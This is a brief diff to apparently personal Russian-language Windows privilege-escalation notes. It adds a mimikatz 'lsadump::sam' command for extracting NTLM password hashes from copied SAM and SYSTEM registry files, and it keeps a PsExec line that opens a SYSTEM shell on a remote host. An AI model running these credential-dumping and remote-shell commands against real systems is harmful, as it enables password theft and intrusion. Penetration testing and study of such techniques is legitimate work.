@@ -1,3 +1,9 @@
+Как извлечь хеш пароля пользователя NTLM из файлов реестра
+.\mimikatz.exe
+lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
+
+
+
 # Up_windows
 Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)
 для psexec
